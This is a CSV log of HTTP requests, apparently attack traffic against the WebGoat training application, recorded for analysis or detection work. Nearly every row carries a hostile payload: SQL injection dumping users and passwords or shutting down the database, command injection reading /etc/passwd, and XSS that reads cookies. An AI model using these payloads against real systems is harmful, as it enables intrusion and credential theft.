_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
f16b6b1a-acdc-4b6c-af45-c66fb0953d01,4e84786fcbdc48b1fa795dd57276f85d,14745,64.246.157.212,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:51.196282
7e0d173b-e0ab-47fc-be6f-4193c524c882,000dc31ad04dd7732915fc7daee02141,307,183.121.198.10,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9794'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:51.250155
b397c19d-da14-439d-ad22-2e030085a83a,38db6e17a18a87766cfd5e6952400ead,14753,80.40.28.61,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'Mied7Bmb'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:51.439486
9f3defda-47a8-475b-84af-2c78f524eebd,c8103ea3e77c7c6396c7a57d28eebcf5,14753,165.82.123.98,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'O0t5wbiL'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:51.442477
44703cda-f31c-4cb7-ab9e-d54f67a1566c,1590c135e8d5aafff7756d168f075fc4,279,189.72.206.134,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=LeTLL0QB,200,2025-10-12T01:12:51.444477
dc6b04bb-6481-4ac9-b6ed-8b1efc1a05b8,0d43072de7ac78e0cbaeecce1b8d19aa,273,157.92.36.150,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9286'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:51.496617
d0f795fc-2003-4bf1-892d-870f4aaf2c15,04c58d2e38cf5b201c3b7e5f4062c624,14753,133.42.160.48,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'BT2Ys8Bo'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:51.549805
7aa423f5-cee8-441e-9024-27cc3a7f3ae7,6d6f2bb8b73be0665636e55db3b8a0e2,14753,91.166.181.121,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'jF5EtTWZ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:51.553989
63712c6e-7a78-4301-b92d-d309a2456cc4,7e78e795ac48328ea7298c43bd9dcd06,307,35.54.148.104,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6210'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:51.558479
4c32c830-a33f-46a1-98a2-9175dbdd2143,c6d17c7d1c11d23601ddee57667bba3f,273,120.41.198.189,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9994'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:51.773184
1c59a992-972c-46f5-8595-89e7d7a9c8b2,e788a468ebdb97d3a669c5b89cecc916,14745,217.81.66.87,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:51.786770
feead84e-47c0-4c8f-919d-3d57c28c794a,589e9e051d51b042dddae502754b22d3,273,189.165.20.70,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2309'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:51.834582
3255de54-6248-4379-96e4-db7c248a155b,bedbe051eaa8d3e1dd2abc9c7a907ab7,279,141.191.111.39,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=XaaK5Li2,200,2025-10-12T01:12:51.886741
90737a5d-45e0-4be3-8c8c-0bd18f2b6498,88a359652d18241fb9b7af096a6a16f0,14753,75.222.157.255,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'f9qHuzY3'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:51.937331
6bd9d438-f46b-4e08-b0fa-4c9f7bf3f4cd,87f00c41bbc497afe09d52f0b736c145,367,151.122.244.151,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2848'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:51.940326
d72cd759-a640-4170-92e4-4e91000c6b1b,693f9ed40e285a7fdf4b10b5d2509de2,14745,145.127.82.231,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:51.994604
95ca8703-906c-41cf-82c8-7dce89da936f,73f750bc5f9de0a2d12e37a20f6ff248,14745,2.84.22.152,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.042285
9b4d75ce-6df9-40ad-844b-f257ddca2901,21b9de5ab69ecccef820b626a2fc5d63,273,206.87.159.132,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1096'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:52.088167
90262870-db76-4c4a-9688-92a662978de2,f863acc0426c82856ef573cb559e2a55,14745,193.254.234.151,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.143298
ddb61d8a-5057-445f-8bdd-72b4281e1c54,c781ec717501b04f6b03d53cbe4ec5cd,14753,49.29.20.41,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'kVpYi9mY'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:52.189077
52ffcc36-f0ba-4d99-922e-67b0ac0ca5f2,79efee91d5117d031b49cd12198d5fdf,273,181.146.55.187,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2603'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:52.192592
0c0af59f-9e90-4c0c-8145-055cfb15aeeb,37b26ae4112f59cff97c153ac9e29eec,14753,66.121.19.214,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'yhNdOKPh'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:52.243164
24349de4-12a2-4af2-a319-d0eb2ef19256,f5ceac83b8de0485c9fd6e88a1d721f9,14745,148.78.102.77,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.247168
021b7eb4-dee3-4dbc-af7e-88e347e61220,1cd41860a76fddd95f13c326601ac92a,279,106.8.76.239,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=jvAVOrZ2,200,2025-10-12T01:12:52.293312
2bb14ecf-c891-4cff-ab29-e549fe5e190e,232a3f60e299f5dc045b6a9a967f69ab,273,140.102.102.159,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5951'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:52.344434
5416c340-00ee-4ec5-ac07-4582eca2e025,79588ce8e857db07660577706e9c4bff,14745,163.236.143.51,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.400307
9b5600b8-a102-42ea-a27d-8d8b7173606b,fb96444012830630f4da119233feaadb,279,209.79.200.161,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=ihY4xTmW,200,2025-10-12T01:12:52.448753
45a23b9f-6e3d-4324-bd1c-d4d64f8204cf,c72aa12386b1f4665d45070733527f6b,279,111.147.145.83,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=N4l65UjE,200,2025-10-12T01:12:52.502170
cb675b64-b45d-416b-b2f2-b5cb257f7bd7,80e6539052b1ef02f4abc5568a8485cc,367,100.15.13.59,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9930'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:52.552819
cc498343-8970-4b8c-b602-6e8817e39fb3,0b27cc6b2137a37f87170e36fdee9938,273,155.58.208.145,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1147'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:52.607138
d7f6fad6-2228-4b7f-ad72-64f754ffa100,eb9a954b3b7822d31329fa2fe957fc45,14745,31.217.166.4,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.659727
09bea216-8342-47d6-b9d7-bc83ec328d04,43939cf3a2ce8b35725b13107ff21a5b,14745,100.253.120.254,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.708381
d1c3c5e5-85a9-44d6-8b0c-ae341a71dfeb,d58d41aa5019b5380b8d9070a21f2e87,14745,85.161.12.211,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.756974
4bc5adbc-6e49-4baa-a996-ab320ad4b367,395ff6541f0fb71a2456823ef2048e9e,367,48.211.89.30,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7378'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:52.804336
d59e0807-09f2-4a3d-b82e-636188229b6a,689d48e13be4ea50b9bd2d0bcc6802fc,14745,136.197.173.39,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:52.858995
28727453-96e2-48db-8674-94c22db24d34,65f4bb4036ddc91e338d1fd046730f0f,273,216.11.253.249,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6001'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:52.904001
7586b775-a84a-41c3-95ee-be0b86c04c7d,5b4998ad825e2b5e20f45695a3963c51,273,183.148.113.224,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8014'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:52.961327
ce80923b-0c9f-4f20-8270-5071b7c22e43,def0905599af1ae38ea31979cb79abe2,14745,120.63.34.84,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.012580
0202c927-0910-4de2-9274-e3750f71eb0e,2516b4640ce98d8324bba2ba6dfd01f8,14745,115.37.24.119,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.061264
5195251f-0015-4d29-bcc9-7a48eb748cf4,12215a1aa4696bf5e91b80d8d0eebe7d,14753,147.73.196.105,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'SVavI0RD'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:53.108526
1f5db12f-85e0-4a37-906c-3f887911d7f8,d911d42bd88b56325de459e07ecf81f2,14745,181.107.124.72,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.112037
508385aa-3a56-4995-931b-27efa10ec5c6,d6df571d7c4d97a93a803965370e1769,14753,77.89.210.54,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'bTK5Wax8'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:53.160342
50845087-125b-4965-93d6-6478fe652727,7c74351e628c7fafb7b1b040d8b9a94e,14753,158.244.160.64,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'kSGQYq41'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:53.164863
9b6ade15-614c-4ad3-b7bd-a78b161f3067,4a1231221a1160d2ced623930b444e65,307,85.179.142.245,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4025'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:53.168865
30218699-939c-4dbc-ac2e-11fd4c8ac04b,2a714d4863d65b69c500c4b287db410f,14745,25.192.44.24,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.358548
0fc422b2-dcfe-46c1-8ce8-0ca03b09e366,bfbe6db45380dc993c8666b0db3ab7be,367,102.81.238.115,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2348'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:53.363386
5b229c04-1a4b-470c-9182-3167bd437605,9be51a62555ec99a53f2350e641821f8,14745,216.177.208.255,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.414625
eb52d68a-5af7-47c0-8bab-f5c55e09145b,ad6111f1722fe7cc25f0d13b7d1ab21e,14753,143.77.195.65,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'fnzCMmC6'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:53.460741
a5675217-36fe-46d6-bd96-d69f91c7599b,2ef0a065198cf09c975cb71ef53e9f5b,14753,94.101.180.41,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'ARcIMQL7'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:53.465431
c563817c-33f7-4c3a-b0c3-4fb503b3da0c,5fd2ff50a8636ce0eabf585dc765acb1,14745,107.28.50.96,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:53.469939
fa43884d-0924-4f70-aaf5-e21cb13fa449,adc06b598506211c2d095536ce9eb8eb,307,38.176.132.27,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8130'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:53.515911
d44e87fd-d708-4f82-8b44-4904d3389873,ad35e733d599fc4c3dda445b496b9287,279,131.188.85.233,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=xOyBXbwr,200,2025-10-12T01:12:53.719129
ae2ad64f-af15-4018-9d57-037d29e4aa4b,18f7b90e0b763f89b145d5f8c1bafdd0,279,189.15.19.206,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=fCfHIdIR,200,2025-10-12T01:12:53.727672
152612cb-0d95-4b42-86dc-c6285c096f99,ab6f780466d88ac060e252c715d24e7d,14753,202.160.195.34,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'o1BKExdT'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:53.780552
bbe5428e-2de2-47eb-952f-00fb0b4b437f,6eed6cd3f7415404f24e6ba267c8b3fa,307,122.12.59.54,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5549'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:53.784117
24e9b407-541c-41ca-b087-3ed4dd76f838,e49ea77dd1fc28499197ad37cfb7742a,279,147.116.100.193,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=HjeeR6gu,200,2025-10-12T01:12:53.978551
c1aa619c-862b-4f68-a56c-58131327e8ec,46a27963ff31b2ca7124a2a57aa6fe88,279,197.162.10.56,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=cr64zTS0,200,2025-10-12T01:12:53.984925
215c26d4-57ea-45b1-8f1a-c852cf1056d4,da33597433c43cac180228ca09433dbb,14745,107.112.47.40,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:54.037454
f501d2cb-73ec-4d3f-819b-95728dd39585,4a3cf51a3c3f1a7d63150b7cde9f5ebd,14753,145.206.86.194,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'gyQvqUkv'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:54.085477
79b4251f-7043-4a34-b51d-321a5b54946b,6491cc79f0cad62ab5927627650af2bd,367,137.101.83.106,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5409'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:54.088985
c47790bb-70d7-4230-b701-c35c31b2a186,131bccc78a3e41f45f163cd4bc0d2245,14753,97.14.198.135,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'OISWh3wx'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:54.142663
092336f4-49de-45e2-a5af-1968b65ce2d9,23dad8226d0be977082785f4b7d8ebe4,279,214.116.115.149,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=CugObBDr,200,2025-10-12T01:12:54.148914
c218b974-fe67-4790-9fe1-ec0060435a85,da75ab2bbbdb4e617644ecf4ba126323,14753,27.218.37.231,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'tz3Z8sYd'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:54.201946
ca9948ef-df27-4fe9-b1e0-c98c68618fcb,72fa63f9b852cb09e2b7bc284e74b306,14753,164.110.98.253,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'VTVLoChs'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:54.205111
5fd4e356-fc33-4940-acde-cc3b7effc485,fc320d98f00d4d28558c70cac053a35b,14745,155.58.61.205,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:54.208207
a8ead81b-9b81-4ebb-97a6-60eb8bee01ef,ecc6e885e135909c08857b019af11d7e,14745,26.16.65.36,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:54.252598
657c9d39-fa2c-447b-9efd-7eead8633f26,b60013c38f90bfbb2e8e8d166acd976a,279,37.246.123.138,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=Q0XPYfA4,200,2025-10-12T01:12:54.300915
ecc3dace-92a2-4ff0-b2fb-4afaf93c18b2,916b5179251f50c197efd95f76ba05d0,279,57.61.79.226,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=4094Y2H6,200,2025-10-12T01:12:54.354338
5f569396-b637-4965-a890-00a0853f5f5e,846462fd5ac4371f9341e1dc094ae277,279,172.11.185.2,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=IHtxTcPn,200,2025-10-12T01:12:54.407988
c29871d7-9c37-4cea-b270-2aa0577f5617,a51c821a97422d6752c986686493cd8d,273,202.50.95.139,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5738'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:54.461996
4bc0e7c0-cc58-4e5f-9ebd-be39701de6a2,796b76b8b5962c21cad1172e3b2decfc,367,28.7.89.174,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3939'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:54.515449
ca98bfee-fa01-409c-a96d-6cd841c38fdf,8222b71f7a4f893f42b2f3ed886075a7,14753,67.190.128.192,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'a1q49qLl'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:54.570002
9d473beb-fe85-41ed-b61e-1ca283a9bcd3,61c97f435fd2ffc7e03b638c8e4c8f7b,14753,7.206.219.237,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'UAjSjEBl'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:54.573003
4bc08e7e-413c-486d-a6d4-634731ddb6a9,3686eb97d2d603847f51c151844c605a,279,119.138.70.49,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=NZLlZMJ9,200,2025-10-12T01:12:54.577520
28099590-87a1-49df-8b0f-21b0e726488d,9e1adbdd4f4727eea2444128f4ef1181,14753,54.154.237.71,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'fNFDnUbC'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:54.628916
c802a644-d2d1-4bc7-a7af-a10d378f4598,d7f796a52534fb6c8d84b6230e5983d9,307,199.245.151.40,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5705'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:54.632918
2f5c3cc5-793e-475f-a2b0-76c95668355f,071d2edde2c8b6c081dcec86e2e69542,14753,55.226.254.152,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'EtkO8sM2'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:54.831525
5529c38b-6d2b-4df3-9e36-5b9a9b3aff18,de2215a7aa538eea91cd18ef5d9df320,14745,215.29.237.11,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:54.837049
cc0df216-23a4-4f0d-be59-7e0ccebfd33b,01ba17e3e1d8b474bb146da32531da28,367,205.199.252.6,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6522'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:54.884424
d80d9e5f-1bf2-459b-b8ff-46ecb06a5080,8c1513bb7146a99bf79df3d5448ee336,14745,151.18.165.84,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:54.939426
7e571696-3314-479d-8532-47ef2e6e6a68,d6767fa536922dfd19c0816351c6327e,279,180.170.189.203,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=hsPFuDCn,200,2025-10-12T01:12:54.988693
08a4dfb0-1ed7-4bb6-9931-ddcc2f491cb7,7a42a73f193f2a0597bfaf91ea16654e,14753,75.163.219.144,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'NR09RFMZ'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:55.042208
90d99a3d-8fb2-435c-9344-a3e4ed57e352,c5dbe28147bc974f9182d025b96fd9fb,14745,79.165.163.253,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:55.048455
ea7f483a-e0af-4f39-8973-df5e7cb391a9,79c7e54744f89429bac6a7b768e3afb9,273,31.199.229.40,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4537'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:55.092869
c51f9c01-6a09-4321-8093-32990a8e7d16,e6f2ce7f1bfc6df85ebe0ec2c78b0551,14753,86.125.165.107,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'B6ilIanU'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:55.147483
3d1c1581-0e98-4bd9-9cf7-60ab336851f7,ce161e9e957da5ee8faae98e3b08dd86,279,37.106.6.165,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=FGAMScZ4,200,2025-10-12T01:12:55.152487
27d1784b-ea7a-4843-947a-29213f1b4d40,74c7f0bee051ede1cde35ffcd98261b5,14753,29.253.14.38,POST,cia/command-injection,HTTP/1.1,"[('_uid', '7a6letcP'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:55.200991
1b02ec77-37a9-4f32-965a-770626cec582,b9325eda2f0415356bdfba778319572a,14745,218.216.53.30,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:55.205493
2af5ec12-9aae-4530-8da4-1e4f616693bc,40773e39bec2e49048e3ef919aea007b,307,81.62.59.217,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2357'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:12:55.248275
f6891686-f4c4-4de9-bceb-78a03eb67b44,bab2bd65ec883aae898094abb27cc7f3,273,156.125.147.100,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1529'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:12:55.442960
8bf87a45-dc5b-4977-aee8-9290134ec9c8,9af254fbb205a73c118b39df5eeb46dc,279,27.20.36.106,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=M6ziSTA3,200,2025-10-12T01:12:55.452155
59b1b923-82d9-42df-a18a-b0969f19e8ae,ea793ed5f3f56b175a19d6b7064691da,367,123.48.251.37,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2311'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:55.504467
30b57562-0921-455b-bc25-256c9c3759cf,b1f50db313bdf77667f94033decadf57,14753,78.31.72.45,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'qLHWMuoD'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:12:55.558650
3a37a945-c728-4418-8ab1-541db6c83a99,23307cd7768609e876b4c3e867f075bc,279,58.241.41.50,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=BNMVayBE,200,2025-10-12T01:12:55.564182
186d5196-9a21-46e3-a9ca-27286c02c7ef,a2e5439065d04b09dc501b8fcfe62001,14753,169.190.116.64,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'WbmbQer3'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:12:55.616367
529b6538-2e9a-40c5-8ca1-dc72cca569fb,c2fbce3c66b061e1f3f5c73fb2725580,14753,91.90.237.96,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'BlneL0Ob'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:12:55.619776
7793802f-d625-4504-baee-003af72f1839,7a38b84970e37231bde3bcf0b8c9cf79,14753,76.115.131.206,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'lvJhUExh'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:55.623303
ad64b83e-3be2-401f-927f-56256cb22181,0a12b37dcc7b51ddfe7ee9e50da26a86,14753,129.96.45.61,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'UHVVU2V0'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:55.668471
91f58f33-7a64-4d7d-92ad-09f25bac21b3,de44cfcf05dc3d1442b96e9dc1dd4d90,14753,99.109.141.6,POST,cia/command-injection,HTTP/1.1,"[('_uid', 's4SY8IIM'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:12:55.672939
887e1695-2084-46ad-aaa1-0277cb9a7a11,adf7e82eb33fe91b1b89d8b0807e104c,14745,130.57.177.198,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:12:55.679956
8737e1bc-a7f9-4980-830a-7c578fe8c6c1,5e15ae439c99e70cc14a217947695721,273,34.153.53.224,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4718'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:12:55.727942
694b652c-0aac-44f5-a18e-bcc5d8ef7aa1,47ac0efcc3b578565c5e512491f39211,367,70.94.71.8,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5671'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:12:55.785932
5e713741-e4eb-4cbd-9b02-5b54723c0ee7,704272975b793e1f8acf566c4f37eaba,367,171.223.239.97,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4319'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:12:55.840397
426a54a5-a04c-43e4-a735-5b78aa9c43ac,cc05ee1679ce388950ed83a527c66be5,279,72.226.215.98,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=BjS1TLAG,200,2025-10-12T01:12:55.896173
6134fbf9-8680-4040-b145-53b32a985501,5e35cccafd67e1f3eed4ca544ec2987b,279,80.236.225.184,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=9LXWuxD4,200,2025-10-12T01:12:55.948102
b2a020ac-57f5-4bba-9f9c-42c2e951e741,201ce9b243d1378126150575716221c7,273,200.70.195.172,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8965'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:12:56.000668
